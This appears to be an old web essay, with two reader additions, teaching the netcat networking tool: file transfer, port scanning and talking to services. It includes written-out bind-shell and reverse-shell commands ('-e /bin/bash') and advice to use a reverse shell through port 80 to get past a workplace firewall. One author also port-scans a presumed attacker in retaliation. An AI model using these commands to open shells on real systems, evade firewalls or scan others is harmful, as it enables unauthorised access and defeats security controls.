@@ -1,0 +1,768 @@
+<html>
+   <head>
+   <!-- web searching lore: pagename begin -->
+   <title> (¯`·.¸ (¯`·.¸ aznetcat.htm ¸.·´¯)¸.·´¯)
+</title>
+   <!-- web searching lore: pagename end -->
+   <meta http-equiv="Content-Type" content="text/html;
+charset=iso-8859-1">
+   <meta http-equiv="Content-Style-Type" content="text/css">
+   <meta http-equiv="Content-Script-Type"
+content="text/javascript">
+   <meta name="description" content="This site teaches basic and
+advanced search
+   techniques for people interested in finding any kind of
+information on the web. Here
+   are
+   informations, documents, links, etc. related to web-searching">
+   <meta name="keywords" content="searching, combing, klebing, how
+to search,
+   search
+   techniques, hints and tips for searching the web, How do I
+learn to search?,
+   Advanced
+   Internet searching, How do I search the web?, fravia+">
+   <meta name="author" content="fravia+">
+   <meta name="copyright" content="Copyright (c) III Millennium
+fravia+">
+
+   <STYLE type="text/css">
+   A:link { color: #02F }
+   A:visited { color: #808 }
+   A:hover { color: purple; background: #AFB }
+   </STYLE>
+   </head>
+   <body bgcolor="#CCCCCC" TEXT=#001010 LINK=#0000FF ALINK=#00FF00
+   VLINK=#3366CC -->
+   <!-- fravia's searching lore: bigtitle, begin -->
+   <center>
+   <!-- fravia's searching lore: bigtitle, begin -->
+   <font size=+3>~ Essays ~</font>
+   <!-- fravia's searching lore: bigtitle, end -->
+   <br>
+   <!-- internet searching techniques: imageheader begin -->
+   <table border="0" ALIGN=CENTER><tr>
+   <th bgcolor="#993300">     </th>
+   <TH BGCOLOR="#993300">  </th>
+   <th BGCOLOR="#993300"><a href="essays.htm"><IMG
+   SRC="images/basipet.jpg" ALT="to essays"
+   ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+   HSPACE=0></a></th>
+   <TH BGCOLOR="#993300">  </th>
+   <th bgcolor="#FF0000"><Font color="#993300" SIZE="3">
+   essays</th>
+   </tR></table> (Courtesy of fravia's advanced searching
+   lores)<br><bR>
+   <!-- internet searching techniques: imageheader end -->
+
+   <FONT SIZE=+3> (¯`·.¸ The awesome netcat utility ¸.·´¯)
+   </font><font size=+2><br>by Angela Zaharia<BR></FONT>Originally
+published at <a target=_top
+href="http://www.searchlores.org">searchlores</a> in
+  October 2001, updated in <font color=blue>October</font>
+2003<br>
+<br><i>Oldie but goldie... some readers will learn a lot, here,
+maybe too much. Well, seekers must
+know how to punish and how to retaliate, at times.</i>
+   <br><font size=+1>
+
+    <a href="aznetcat.htm#vvfadd">A small addition, by vvf</a> (june 2003)
+<br><hr width=44%>
+   <a href="aznetcat.htm#kivadd">A big addition, by KIVILCIM Hindistan</a>
+(October 2003)
+<br><hr width=44%>
+
+ <H1>The awesome <A href="zipped/nc11nt.zip">netcat</A> 
+utility</H1></CENTER>
+ by Angela Zaharia<BR>
+<BR>
+The usual disclaimers apply. <U>DO</U> try this at home kids,
+experiment with it as much as you can, but do NOT not hold me
+responsible for any damage you do. Now with <U>that</U> outta the
+way...</P>
+
+<B>Netcat</B> is an old skool hacking tool, written last century
+(in 1996 to be more
+precise- eons ago in Internet time) by the very talented Hobbit 
+(see <A href=http://www.avian.org
+target="_blank">http://www.avian.org</A>).
+He created it to test network connections and find possible holes
+inside
+networks and servers.
+<br><br>
+<B>Netcat</B> has been called the Swiss Army Knife of TCP/IP and
+with a good reason!</P>
+
+
+Sure, today there are much more advanced toolz now available, port
+scanners, SATAN and SAINT, but <B>Netcat</B> has withstood the
+test of time. It is still quite useful. First, it has a small
+footprint. Second, it is a command line utility, and can easily be
+included into scripts and added to a string of commands. Combine
+it with pipes and it can be deadly.</P>
+
+<br><br>
+
+ <B>Netcat</B> was originally written for UNIX, but has been
+ported to NT/Win9X by Weld Pond of @Stake (formerly L0pfht
+security research group). You can grab its
+source code at <A href="zipped/nc11nt.zip">fravia's</A> or from:
+<A href=http://www.atstake.com/research/tools/network_utilities/
+target="_blank">http://www.atstake.com/research/tools/network_util
+ities/</A>, and it can be recompiled with the
+"gaping_hole_exposed" function which was left out of the NT/Win9X
+version for some mysterious reason...;-). The *nix version is now
+part of the Red Hat Power Tools collection and comes standard on
+SuSE Linux, Debian Linux, NetBSD and OpenBSD distributions. The
+1.1 version runs on Win 95/98/NT/2000. Sorry, I dunno 'bout XP and
+frankly, I don't care.</P>
+
+<br><br>
+As mentioned above, <B>Netcat</B> is a deceptively simple NON-GUI 
+(meaning it's a command line)utility which reads and writes data
+across network connections, using TCP or UDP protocol. Yes, you
+<U>do</U> need to know a few commands to use it. But don't let
+that turn you off. I have just began using it so I wanted to share
+my experiences and see if anybody else can teach me more.</P>
+
+
+With <B>Netcat</B>, I hook up a network socket/port to one side
+and
+a program to the other side of it and I can create all kind of
+server-ish stuff,
+from serving or streaming files to putting a counterattack against
+hackers.
+
+<B>Netcat</B> easily functions as <U>both</U> a client and a 
+server,
+ by listening for inbound connections on arbitrary ports and then
+doing
+the same reading and writing. It can happily shovel data back and
+forth until there isn't any more left; it doesn't particularly
+care
+ about the direction.
+<br><br>
+ A <B>Netcat</B> command has a very easy <B>nc - host - port</B>
+format. <B>nc</B> is the program itself. <B>host</B> is the domain
+name or IP address of the machine we are connecting to/from. 
+<B>port</B> of course are the ports you will be using it on.
+
+<B>Netcat</B> uses multiple switches too. Some of them are:<BR>
+<UL><LI><B>-v</B> stands for verbose, meaning gimme back as much
+info about your activities as you can, netcat! its a good idea to
+run netcat most of the time with -v turned on, so you can see info
+about the connections it is trying to make;  <B>-vv</B> is for
+very verbose,
+<LI><B>-e</B> execute this program  (<B>-e cmd.exe</B> or <B>-e
+/bin/sh</B> for example, hehe)
+<LI><B>-d</B> is for stealth mode,
+<LI><B>-n</B> [when specified, <B>netcat</B> will only accept
+numeric IP addresses and do no DNS lookups for anything],
+<LI><B>-l</B> is for listen, and <B>-L</B> [listen, and if the
+system you are on gets rebooted, keep on listening],
+<LI><B>-p nn</B> is port, and nn is the specific port number  
+(<B>-p 80</B> for example) absence of -p will bind to whatever
+unused port the system gives you, just like any other normal
+client connection, unless you use
+<LI><B>-t</B> option tells <B>netcat</B> to handle any telnet
+negotiation the client might expect.
+<LI><B>-u</B> do UDP instead of TCP,
+<LI><B>-o</B> logfile[obtains a hex dump of the data sent either
+way], etc</UL></P>
+
+
+
+Let's dive right into a few very neat tricks you can do with
+<B>netcat</B>:
+
+<br>
+<br><A HREF="aznetcat.htm#transfers">file/programs (use your imagination here!)
+transfers</A>
+<br><A HREF="aznetcat.htm#scan">basic and advanced port scanning</A>
+<bR>
+<A HREF="aznetcat.htm#connect">connect to remote TCP/IP ports</A></P>
+<BR>
+
+
+<A NAME=transfers target="_blank">
+<H2>Files/programs transfers</H2>
+ One time my ICQ's file transfer function wasn't working, and a
+friend wanted to send me a drawing he had done. Why not use
+<B>netcat</B> I thought. My friend doesn't know much DOS ("he
+hates it" he sez!), but he was willing to give it a try. So I told
+him where to go and d/l <B>netcat</B> from, and to make sure to
+install it in his C:\ root dir. Then I asked him to go to a DOS
+prompt and to type the following command[the bold is what he
+typed]:
+
+<UL><PRE>C:\><B>nc -l -p 1234 < filename</B></PRE></UL>
+
+Let's go over each part. <B>nc</B> is the <B>netcat</B> program
+itself. With <B>-l</B>, he told <B>netcat</B> to listen. <B>-p
+1234</B> is the port <B>number 1234</B> <B>netcat</B> is listening
+on. <B>< file-name</B> means to grab a file and pass it along to
+<B>netcat</B>.</P>
+
+<B>[NOTE* for all this to work, you have to have both
+<B>netcat</B> and the file you want to send in the DOS C:\ root
+dir. that's not necessary all the time, but it will save you a
+lotto typing, so make sure to move the files you'd wanna send to
+C:\ root]</B></P>
+
+Then on my end, I also opened a DOS prompt and typed:<BR>
+
+<UL><PRE>C:\><B>nc -v my-friend's-IP-address 1234</B></PRE></UL>
+
+and received a whole lotto ASCII garbage. Wait a minute, this is
+<U>not</U> supposed to happen! What did I do wrong?? The answer
+of-course came to me:
+I hadn't specified the name of the file or what to do with it! So
+I told my friend to re-type his command again and then I re-did
+mine:
+
+<UL><PRE>C:\><B>nc -v my-friend's-IP-address 1234 > test.jpg
+</B></PRE></UL>
+
+Let's look at what I typed in detail: <B>nc</B> is the
+<B>netcat</B> program itself. With <B>-v</B>, I told <B>netcat</B>
+to gimme back as much info about its activities as possible. (its
+a good idea to run netcat most of the time with <B>-v</B> switch
+turned on, so you can see info about the connections it is trying
+to make; v simply stands for verbose and <B>-vv</B> is for very
+verbose. <B>my-friend's-IP-address</B> is the numeric address of
+my friend's PC (I had found his IP number earlier by running a
+simple <B>netstat -n</B> command on a DOS prompt). <B>1234</B> is
+the port I sent <B>netcat</B> to listen on. <B>> test.jpg</B>
+meant to save the output from <B>netcat</B> as a file named
+<B>test.jpg</B>.</P>
+
+And this time I got the file, right in my <B>C:\</B> root dir.
+Easy as 1-2-3, as long as I knew what I wuz doing! Next time, I
+will send a file to him and see if he can grab it. Who knows, he
+may even end up learning some DOS that way, eh, hehehe...</P>
+
+<B>[NOTE* when using netcat in DOS/Windoze, make sure you specify
+the 3 letters' file extention type like I did -.jpg]</B></P>
+<BR>
+
+
+
+<A NAME=scan target="_blank">
+<H2>Basic and Advanced Port scanning</H2>
+
+Another thing <B>netcat</B> is perfect for is TCP and UDP port
+scanning. I get scanned a lot myself, and my ports do get pocked
+and probed all the time. I ain't lying. I have set up my olde
+trusty <B>@Guard ver 3.22</B> firewall to pops up and tell me each
+time somebody tries anything funny. So when <B>@Guard</B> jumped
+up and told me I was being fingered on several ports while I was
+trying to work, I got mad and decided to finger them right back!
+And <B>netcat</B> is perfect for that!</P>
+
+So I grabbed the IP address of whoever was bugging me from my
+<B>@Guard</B> (<B>@Guard</B> <U>always</U> records and displays
+the IP addresses) and fired up a DOS prompt. There I typed:
+
+<UL><PRE>C:\><B>nc -vv -z -w2 my-attacker-IP-address
+1-140</B></PRE></UL>
+
+
+
+Let's go over what I typed again: <B>nc</B> is the <B>netcat</B>
+program itself. <B>-vv</B> means to be very verbose, the <B>-z</B>
+option provides zero mode I/O and is used for port scanning, and
+the <B>-w2</B> provides a timeout value for each connection. the
+above command will scan all ports from <B>140 to 1</B> on the
+<B>my-attacker-IP-address IP address</B>. Aren't I nasty, eh?</P>
+
+Meanwhile, <B>netcat</B> was trying each port and sending info
+back:
+
+<UL><PRE>
+my-attacker-IP-address 139  (?) closed
+my-attacker-IP-address 135  (?) closed
+my-attacker-IP-address 110  (pop-3) closed
+my-attacker-IP-address 106  (?) closed
+my-attacker-IP-address 81  (?) closed
+my-attacker-IP-address 80  (http) closed
+my-attacker-IP-address 79  (finger) closed
+my-attacker-IP-address 53  (domain) closed
+my-attacker-IP-address 42  (?) closed
+my-attacker-IP-address 25  (smtp) closed
+my-attacker-IP-address 21  (ftp) closed</PRE></UL></P>
+
+Opps, how silly of me! Of-course all of his ports from 1 to 140
+will be closed! I keep on forgetting the simple fact that all
+ports from 1 to 1024 are "reserved". So I re-did my command again,
+this time using ports 1045 to 1025:
+
+<UL><PRE>C:\><B>nc -vv -z -w2 my-attacker-IP-address
+1025-1045</B></PRE></UL>
+
+and got <U>much</U> better results this time, hehehe:
+
+<UL><PRE>
+my-attacker-IP-address 1045  (?) open
+my-attacker-IP-address 1044  (?) open
+my-attacker-IP-address 1043  (?) open
+my-attacker-IP-address 1042  (?) open
+my-attacker-IP-address 1041  (?) open
+and so on...</PRE></UL></P>
+
+
+<A NAME=connect target="_blank">
+One of <B>netcat</B>'s most simplistic uses is connecting to a
+remote TCP/IP port. I decided to try it on my attacker, so I
+opened a second DOS prompt and started another <B>netcat</B>
+running:
+
+<UL><PRE>C:\><B>nc -v www.my-attacker-IP-address
+1045</B></PRE></UL></P>
+
+ and got back the following info:
+<UL><PRE>my-attacker-IP-address 1045  (?) open</PRE></UL></P>
+
+Remember, the <B>-v</B> switch meant that <B>Netcat</B> should
+return as much info as it can about its activities. <B>1045</B> is
+the port I was fingering/trying to attach to. So now I knew port
+1045 was open and maybe even ready to accept input?</P>
+
+
+Let's try another port first, port 1043 this time:
+
+<UL><PRE>C:\><B>nc -v www.my-attacker-IP-address
+1043</B></PRE></UL></P>
+
+
+And <B>netcat</B> informed me the IP address I was trying to scan
+was invalid! Ho-ho! I guess whoever they were, they decided they
+had enough and logged off the Internet! isn't that great or
+whut??</P>
+<BR>
+
+
+
+As you can see, <B>netcat</B> has <U>many</U> different uses. I
+have only began using it, so that's all I can write so far. But
+I'm eager to learn about more <B>netcat</B>'s uses. if anybody has
+had any experience with it, I'd love to read about it.
+
+
+
+Of-course, <B>Netcat</B> can be used and combined with hundreds of
+other utilities, shell scripts, etc. Your imagination is the only
+limit! I am sure you will be able to come up with hundreds of
+other uses! Enjoy and spread the knowledge around!</P>
+<BR>
+<BR>
+
+For any corrections, additions, hate mail or love letters, I can
+be contacted at <br>angelazaharia[A_T]ziplip[POINT]com<BR>
+<BR><a name="vvfadd"></a>
+<BR><hr><center>A small addition, by vvf (june 2003)
+</center>
+    <pre>
+The other day I was fooling around with <A
+href="zipped/nc11nt.zip">netcat</A>. Except for
+<a target=_top href="http://www.searchlores.org/aznetcat.htm">AZ's
+piece</a> about it, I had never came across it before. I
+tried to see what it can do on a linux machine, where it's
+bundled with the distro (SuSe).
+The first useful thing it can do is scan ports, either
+specific ones or ranges.
+You have to give it an ip and a port (port range), then,
+when it finds an open port, nc gives a message like
+xxx.xxx.xxx.xxx 80 (http) open, followed by a cursor.
+It's the cursor that bothered me. It is in fact a prompt.
+What can you do with an open port 80, usually?
+It's the http port, so it should be able to understand
+browser commands. I tried a 'GET' and suddenly I had
+a return that looked like html (a html error message,
+actually).
+
+Sooo, this allows me to talk directly to the http server.
+Good.
+Let's run a little test: fire up console (for its scroll
+and other facilities) + Opera in linux, found the ip
+for nonymouse.com, then fed it to netcat like
+this:<font color=blue>
+netcat -v 212.227.109.214 80</font>
+where -v is verbose mode and 80 is the port, expected
+to be open.
+netcat returns an open port and a prompt.
+
+I typed in this: <font color=blue>
+GET http://anonymouse.ws/cgi-bin/anon-snoop.cgi </font>
+(this is the checking page of nonymouse, showing
+the info your browser reveals). 
+
+What i got back was html code. Cut'n'pasted it in an
+editor, saved as html. I now had a plain html page
+stating my IP and host correctly, but showing nothing
+under "browser".
+So, if I'm not wrong, checking for open ports with nmap
+should give me open ports and a description of what
+the ports are used for, and with this info I could
+use netcat to try to talk directly to whatever
+server or service is behind that port, assuming
+I speak its language.
+vvf
+</pre>   
+<hr>
+<br>
+<BR>
+</font>
+<BR>
+<BR><a name="kivadd"></a><font size=+1>
+<BR><hr><center>A big addition, by KIVILCIM Hindistan (October
+2003)
+</center>
+   <br><br><i>
+   Hello Mr. Fravia,
+<br>
+The first time I came across your site (late 97) I was totally amazed. It was a
+nice good site with lots of usefull info like the good old discmags.
+<br><br>
+Today, I was searching for something and came across the name &quot;Fravia&quot; which
+ringed bells :) I was more than happy to see that, your site
+was up and hacking the SYSTEM (whatever it may be, the Net, the traditions etc,
+hacking to bits and pieces, understanding and reconstructing to own needs :)
+<br><br>
+Anyways, I came across this article about NetCat: 
+(http://searchlores.org/aznetcat.htm) which is a wonderful tool, and by chance
+I've also written an article about NetCat some eight months back which was
+published in http://www.oreillynet.com/pub/a/onlamp/2003/05/29/netcat.html.
+<br><br>
+In the article, I especially stressed out two options which were not in
+Aznetcat article;<br>
+1) cryptcat: which is a two-fish encrypted talking netcat<br>
+2) reverse telnet: which is very nice to telnet into boxes beyond firewall<br><br>
+
+I think, these two facts would be good in addition to that article (or a new
+one) and I'd be more than happy to contribute to such a good site.
+<br><br>
+Keep the good work.
+<br>
+Sincerely<br>
+</i>
+KIVILCIM Hindistan   
+   <br><hr><br><br>
+Netcat and Reverse Telnet<br>
+by KIVILCIM Hindistan<br>
+05/29/2003<br><br>
+
+Today we live a virtually secure world of computing, with fancy
+firewalls, user access lists, intrusion detection schemes, and so
+on. But occasionally you may just want to copy a file from one
+computer to another, without breaching security, ringing bells all
+over the network, or even meddling with cumbersome access lists.
+You may want to reach your work computer from home, so that you
+can finish your work, but the guardian firewall would not let you
+in.<br><br>
+
+Or you may just want to write your simple network utility to fetch
+something from somewhere and do something to it, the famous
+duct-tape method. You don't want to use C++. You don't want to use
+Perl. You want nothing but the good old glue and fix method.
+<br><br>
+For all these seemingly difficult tasks there is a wonderful tool
+called Netcat.
+<br><br>
+As you'd expect, the name Netcat comes from one of the basic Unix
+commands cat. cat "concatenates files and prints on standard
+output", Netcat basically does the same. Instead of concatenating
+files, Netcat concatenates the TCP and UDP sockets, making it
+basically a "cat of ports". Just like its ancestors, the
+fundamental commands of the Unix environment, Netcat does this one
+thing and does it perfectly. You can glue it to other commands to
+make it do whatever you want.
+<br><br>
+This article examines the basic usage of Netcat, including one or
+two tricks that will make your life easier.
+What can I use Netcat for?
+<br><br>
+As a basic point of view, Netcat is a telnet program. But that's
+like calling the Swiss Army Knife just a knife. Netcat was written
+in 1996 by a hacker called Hobbit to meet all kinds of telnet
+needs. Today you can easily find a version of Netcat for your
+flavor of Unix or even Windows. There are also some variants, such
+as cryptcat which adds vital encryption features, which we will
+also use later in this article.
+<br><br>
+This article sticks to the vanilla Netcat. The examples are
+prepared with Unix in mind. You can try them on other platforms,
+but your computer could blowup, your significant other might leave
+you, and, even worse, you will run out of coffee at once. Well,
+maybe just the latter.
+Preparing Network Interfaces
+<br><br>
+To try Netcat, we must first make some preparations. Throughout
+this article we will discuss a connection between two machines.
+For this article you don't need to have two machines, two
+computers, or even two network interfaces.
+<br><br>
+For TCP/IP communication, the Unix platform uses a virtual
+loopback (lo) interface with a default IP of 127.0.0.1. Under
+Linux, you can use 0 instead of this IP address. We will use this
+interface to set up two virtual interfaces.
+<br><br>
+Note that if we interfere with the 127.0.0.1 interface, we may
+break the network connection. Instead, we will use lo:1 and lo:2
+virtual interfaces. The following method will allow you to assign
+many IP numbers to the same network interface, such as eth0:0 or
+eth0:1. As root, enter:
+<pre>
+% ifconfig lo:1 10.0.1.1
+% ifconfig lo:2 10.0.1.2
+</pre>
+Now enter ifconfig to examine your interfaces:
+<pre>
+lo Link encap:Local Loopback
+inet addr:127.0.0.1 Mask:255.0.0.0
+UP LOOPBACK RUNNING MTU:16436 Metric:1
+RX packets:146 errors:0 dropped:0 overruns:0 frame:0
+TX packets:146 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:0
+RX bytes:7708 (7.5 KiB) TX bytes:7708 (7.5 KiB)
+lo:1 Link encap:Local Loopback
+inet addr:10.0.1.1 Mask:255.0.0.0
+UP LOOPBACK RUNNING MTU:16436 Metric:1
+lo:2 Link encap:Local Loopback
+inet addr:10.0.1.2 Mask:255.0.0.0
+UP LOOPBACK RUNNING MTU:16436 Metric:1
+</pre>
+Now that we have two network interfaces, we can continue with our
+examples as if we were working on two separate computers with
+different IP addresses.<br>
+Network Connection:<br><br>
+
+As I've stated before, Netcat is a telnet client. With the basic
+usage you can connect to any port with nc host port. When you make
+a connection this way, everything you type goes to the remote
+machine (if it's listening to that port) and every response comes
+back to you. This goes on until the network connection is broken.
+As for the remote computer, I must remind you that Netcat is both
+a client and a server.
+<br><br>
+Now, let's open two consoles. One will be our server, listening to
+port 5600:
+<br>
+$ nc -l -p 5600
+<br>
+The other will be our client that connects to that port.
+<br>
+$ nc 10.0.1.1 5600
+<br>
+Now everything you do will be repeated at the first console. We
+have made our first connection. Experiment to your heart's
+content. Press Enter, Backspace, Ctrl-D, and Ctrl-C and see what
+happens. Ctrl-C should have cut your connection.
+<br><br>
+At the first console give the command:
+<br>
+$ nc -l -p 5600 -vv
+<br>
+In the second:
+<br>
+$ nc 10.0.1.1 5600
+<br>
+Did you see anything different?
+<br><br>
+listening on [any] 5600 ...<br>
+10.0.1.1: inverse host lookup failed: Unknown host<br>
+connect to [10.0.1.1] from (UNKNOWN) [10.0.1.1] 33354<br>
+<br><br>
+This time, Netcat was generous with its information. The extra -vv
+command option put Netcat in verbose mode. If you use one v then
+you end up with less information. This command is especially
+valuable when troubleshooting. At the end, when you pressed
+Ctrl-c, Netcat exited, reporting how many bytes were sent and
+received.<br><br>
+
+As in our first example we made connection between two virtual
+computers without protocol or rights management (as far as the
+firewalls let us).<br><br>
+File Transfer<br>
+
+One of the most practical usages of this network connection is the
+file transfer. As a basic Netcat function, this feature may be
+used to great effect in the hands of an experienced user. For a
+freshly installed computer, setting up a ftp server or, worse,
+meddling with rcp or scp protocols may be nauseating. Those
+commands may not be available for one, and multiple layers of
+control mechanisms may interfere with their functionality. You can
+still transfer files with just one nc command.
+<br><br>
+At the server console:
+<br>
+$ nc -v -w 30 -p 5600 l- > filename.back
+<br>
+and on the client side:
+<br>
+$ nc -v -w 2 10.0.1.1 5600 < filename
+<br>
+Magically, the file named filename is transfered from the client
+to the server. You can check that they are identical.
+<br><br>
+The command line uses the new argument -w to cause Netcat to wait
+for a few seconds. We made that longer in the server side because
+it is most affected by a pause. Another important point is the >
+and < redirection commands, with which Unix users are very
+familiar.
+<br><br>
+In the server we said > filename.back. Any output will be directed
+to this file. As it happens, the output is the file filename which
+is send by the client. Think of this as a pipeline. We take a
+bucket (file), pour the contents to the pipeline (Netcat's port),
+and, at the other end we fill another bucket from the pipeline.
+Telnet
+<br><br>
+We can now transfer files, but maybe we want to make something
+more useful. For example, we might want to login to a remote
+machine and do some work. We want to telnet without the hassle of
+working through access control mechanisms. The -e option comes in
+handy.
+<br><br>
+On the first console, enter:
+<br>
+$ nc -l -p 5600 -e /bin/bash
+<br>
+and at the second console:
+<br>
+$ nc 10.0.1.1. 5600
+<br><br>
+Now it is as if we are connected to the first machine and typing
+at the shell. We can see every output of our command and do
+whatever we want with the server machine. We are connected to it
+as the root user. This is admittedly very scary and a bit unwise.
+Security Notice and Cryptcat
+<br><br>
+Dumping output to a shell is the fastest method of remote control.
+It opens a port and waits for connection. Whoever connects is
+welcome, with no security checks. Unlike the following Reverse
+Telnet this is an active connection; we can call it duck-tape
+telnet. If you must setup such a thing on an Internet-connected
+machine use Cryptcat. In fact you can use Cryptcat in every
+example mentioned here instead of Netcat, because they are almost
+the same (except that Cryptcat uses encryption and a keyphrase).
+But all the command notation is the same.
+<br><br>
+Small notice: I love Open Source! As the author of Cryptcat
+states:
+<br><br>
+    Linux version -- why I like Linux... only had to change two
+lines of code to add encryption.
+<br><br>
+Thus if you want more security (which you should), use cryptcat
+with the -k option. Cryptcat's encryption scheme has an embedded
+keyphrase of metallica. You can (and should) change this with the
+option -k, using your own keyword. After that, you not only have
+an easy telnet setup, but you also will be very secure.<br><br>
+Reverse Telnet<br>
+<br>
+As we have such a generic tool, capable of many things, we can try
+something nastier (and thus more useful). Consider a nice
+computer, with broadband network access, behind some firewall (as
+all useful computers are) in our office. The firewall will not
+allow any outside connections, only those queried from inside.
+This computer seems impossible to reach. To begin with, the
+computer would not have a real IP that we could just type and
+reach; it is behind a router and firewall, using their IPs
+instead.<br><br>
+
+Now what if we want to log into this computer and use it remotely,
+perhaps grabbing some files we forgot to bring home to work on
+tonight? We want all this with minimum security breach. Sounds
+like a challenge.
+<br><br>
+As we saw before, telnet worked with one machine waiting for a
+connection and the other connecting to it and giving commands.
+Telnet will not do the job here; not only are all ports of the
+corporate firewall blocked, the machine we want to reach does not
+even have a legal IP. Our technique should do just the reverse.
+<br><br>
+We have a server whose only allowed outside connection is port 80
+for daily use, but it doesn't have an outside IP address. The
+other computer at home probably has a real IP and whatever ports
+you want are open at your request. Reversing the roles would solve
+our problems: make our computer at work connect to the home
+computer, taking commands from the client and performing them on
+the server. It's the reverse of usual telnet, so we call it
+Reverse Telnet.
+<br><br>
+First, let's name the machines. The one at work is called WORK and
+the one at home is called HOME. If we do not have a permanent IP
+at home (a dialup user usually) we should get a dynamic DNS name.
+Lots of organizations provide them, most at no charge such as
+dyndns.org. We do this because in order to connect to home
+computer we must know its IP (or domain name) beforehand.
+<br><br>
+At the work computer, we'll set up a cron job to start at 22:01.
+Just as in the telnet example it connects to myhome.dyndns.org
+(our dynamic DNS address) and starts bash.
+<br><br>
+And at home just at 22:00 or so we start:
+<br>
+$ nc -vv -l -p 80
+<br>
+to begin listening on port 80 for incoming connections.
+<br>
+At 22:01, WORK connects to HOME, starts bash and says 'Master!'
+Bingo. We are connected to WORK (or vice versa), and WORK is ready
+to operate any command we want.
+<br><br>
+We can try this at our virtual network (lo:1 and lo:2). To start
+the client listening for a connection:
+<br>
+$ nc -vv -l -p 80
+<br>
+To make a connection from the server:
+<br>
+$ nc 10.0.1.1 80 -e /bin/bash
+<br>
+It is very simple and efficient, because we only use outgoing port
+80, the most widely used port because it is used for web access.
+No one would block port 80 because everyone needs web access. They
+can force you to use a local proxy for that, but you can use
+another port like 21 or 23 which are harder to put behind a proxy.
+If you have Internet access you should be able to find at least
+one open port.
+<br><br>
+Netcat has lots of other uses with which you can experiment
+through the loopback interface setup. As long as you know the
+TCP/IP machine and basics of the protocols, there is virtually no
+limit to what you can do with Netcat. In the future, I will
+describe some other daily (arcane ;) uses of Netcat, Cryptcat, and
+maybe their complicated and powerful cousin SoCat.
+Resources
+<br><br>
+    * Netcat<br>
+    * Cryptcat: Netcat with cryptography<br>
+    * SoCat: Netcat on steroids<br>
+<br>
+KIVILCIM Hindistan has been a magazine writer, freelance
+consultant about Open Source Software & Solaris and a die hard
+gamer.
+<br><br>
+</font>
+<br>
+<center>
+   <a href= "ideale.htm"><IMG SRC= "images/basipet.jpg"
+   ALT= "Petit image"
+   ALIGN= BOTTOM WIDTH= "118" HEIGHT= "68" BORDER= 0 VSPACE= 0
+   HSPACE= 0 URLSRC="
+http://www.searchlores.org/images/basipet.jpg"></a><br>
+   <br>
+   <!-- how to search the web, by fravia+, signet begin -->
+   <table><tR><td width= "300" height= "2" bgcolor=
+"#993300"></tD></tR></table>
+    (c) III Millennium: <font color= blue><font color=
+blue>[</fonT></font><a
+   href= "info.htm">fravia+</a><font
+   color= blue><font color= blue>]</fonT></font>,
+   all rights reserved <!-- how to search the web, by fravia+,
+signet end --> <!-- begin
+   da closing bit, duh -->
+   </CENTER>
+   </body>
+   </HTML>
